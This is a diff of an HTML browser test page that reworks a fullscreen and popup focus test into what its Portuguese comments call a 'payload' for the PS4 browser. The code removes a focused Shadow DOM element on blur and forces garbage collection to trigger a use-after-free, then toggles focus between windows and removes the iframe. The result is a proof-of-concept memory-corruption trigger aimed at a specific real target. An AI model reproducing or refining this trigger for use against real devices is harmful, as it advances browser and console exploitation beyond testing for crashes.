@@ -5,17 +5,9 @@
 <title>Fullscreen Focus Lifecycle Test</title>
 </head>
 <body>
-
 <button id="run">Run Test</button>
-
 <div id="status">Iframe ready</div>
-
-<iframe
-    id="testFrame"
-    style="width:300px;height:200px;border:1px solid black;">
-</iframe>
-
-<script src="resources/gc.js"></script>
+<iframe id="testFrame" width="300" height="200" style="border:1px solid black;"></iframe>
 
 <script>
 var iframe = document.getElementById("testFrame");
@@ -23,9 +15,7 @@ var popup = null;
 var focusTimer = null;
 
 iframe.onload = function() {
-
     var doc = iframe.contentDocument;
-
     doc.open();
     doc.write(
         '<!DOCTYPE html>' +
@@ -37,158 +27,94 @@ iframe.onload = function() {
         '</html>'
     );
     doc.close();
-
-    document.getElementById("status").innerHTML =
-        "Iframe created and ready";
 };
 
 document.getElementById("run").onclick = function() {
-
-    var status = document.getElementById("status");
-
-    popup = window.open(
-        "",
-        "_blank",
-        "width=400,height=300"
-    );
-
-    if (!popup) {
-        status.innerHTML = "Popup blocked";
-        return;
+    // 1. Entrar em Fullscreen imediatamente no clique (Essencial para a PS4)
+    var frameDocument = iframe.contentDocument;
+    var fullscreenElement = frameDocument.documentElement;
+    if (fullscreenElement.webkitRequestFullscreen) {
+        fullscreenElement.webkitRequestFullscreen();
+    } else if (fullscreenElement.requestFullscreen) {
+        fullscreenElement.requestFullscreen();
     }
 
-    popup.document.open();
+    // 2. Abrir o pop-up
+    popup = window.open("", "_blank", "width=400,height=300");
+    if (!popup) return;
 
+    // 3. Escrever o payload original do teste no pop-up (Shadow DOM + UAF + GC)
+    popup.document.open();
+    popup.focus();
     popup.document.write(
         '<!DOCTYPE html>' +
         '<html>' +
         '<body>' +
-        '<h3>Popup</h3>' +
-        '<p>Focus target</p>' +
+        '<p>This test passes if it does not crash.</p>' +
         '<div id="host"></div>' +
         '<div id="result"></div>' +
-
         '<script>' +
-
-        'var host = document.getElementById("host");' +
-
-        'var shadowRoot = host.attachShadow({ mode: "open" });' +
-
-        'var victim = document.createElement("div");' +
+        'function gc() {' +
+        '    function gcRec(n) {' +
+        '        if (n < 1) return {};' +
+        '        var temp = {i: "ab" + i + (i / 100000)};' +
+        '        temp += "foo";' +
+        '        gcRec(n-1);' +
+        '    }' +
+        '    for (var i = 0; i < 10000; i++) gcRec(10);' +
+        '}' +
+        'let shadowRoot = host.attachShadow({ mode: "open" });' +
+        'let victim = document.createElement("div");' +
         'victim.tabIndex = 0;' +
         'victim.textContent = "Focusable";' +
-        'victim.style.width = "200px";' +
-        'victim.style.height = "100px";' +
-        'victim.style.background = "yellow";' +
-
         'shadowRoot.appendChild(victim);' +
-
         'victim.focus();' +
-
-        'document.addEventListener("blur", function() {' +
-        '    if (victim) {' +
+        'async function runTest() {' +
+        '    document.addEventListener("blur", () => {' +
         '        victim.remove();' +
         '        victim = null;' +
-        '        if (typeof gc == "function") {' +
-        '            gc();' +
-        '        }' +
-        '    }' +
-        '}, true);' +
-
-        'window.addEventListener("blur", function() {' +
-        '    document.getElementById("result").textContent = "POPUP BLUR";' +
-        '});' +
-
-        'window.addEventListener("focus", function() {' +
-        '    document.getElementById("result").textContent = "POPUP FOCUS";' +
-        '});' +
-
+        '        gc();' +
+        '    }, true);' +
+        '    await new Promise(resolve => window.addEventListener("blur", resolve, { once: true }));' +
+        '    await new Promise(resolve => requestAnimationFrame(() => setTimeout(resolve, 0)));' +
+        '    result.textContent = "PASS";' +
+        '}' +
+        'runTest();' +
         '<\/script>' +
-
         '</body>' +
         '</html>'
     );
-
+    
     popup.document.close();
 
-    status.innerHTML = "Popup opened";
-
-    var frameDocument = iframe.contentDocument;
-    var fullscreenElement = frameDocument.documentElement;
-
-    if (fullscreenElement.webkitRequestFullscreen) {
-        fullscreenElement.webkitRequestFullscreen();
-    }
-
+    // 4. Sequência de alternância de foco
     setTimeout(function() {
-
-        if (!popup || popup.closed)
-            return;
-
-        popup.focus();
-
-        status.innerHTML =
-            "Focus moved to popup";
+        if (!popup || popup.closed) return;        
+        window.focus();            
+        try {
+            iframe.contentWindow.focus();            
+        } catch (e) {}
 
         setTimeout(function() {
-
-            window.focus();
-
-            status.innerHTML =
-                "Focus returned to main page";
-
-            setTimeout(function() {
-
-                try {
-                    iframe.contentWindow.focus();
-                } catch (e) {
-                }
-
-                status.innerHTML =
-                    "Focus moved to iframe";
-
-                setTimeout(function() {
-
-                    if (popup && !popup.closed) {
-                        popup.close();
-                    }
-
-                    status.innerHTML =
-                        "Popup closed - waiting";
-
-                    focusTimer = setInterval(function() {
-
-                        if (!popup || popup.closed) {
-
-                            clearInterval(focusTimer);
-
-                            iframe.remove();
-
-                            status.innerHTML =
-                                "Iframe removed after popup close";
-                        }
-
-                    }, 20);
-
-                }, 300);
-
-            },300);
-
-        }, 300);
-
+              if (popup && !popup.closed) {
+                  popup.close();
+              }
+              focusTimer = setInterval(function() {
+                  if (!popup || popup.closed) {
+                     clearInterval(focusTimer);
+                     iframe.remove();                          
+                  }
+               }, 20);
+         }, 500);
     }, 300);
 };
 
 window.onblur = function() {
-    document.getElementById("status").innerHTML =
-        "MAIN PAGE BLUR";
+    document.getElementById("status").innerHTML = "MAIN PAGE BLUR";
 };
 
 window.onfocus = function() {
-    document.getElementById("status").innerHTML =
-        "MAIN PAGE FOCUS";
+    document.getElementById("status").innerHTML = "MAIN PAGE FOCUS";
 };
-</script>
-
-</body>
+</script></body>
 </html>
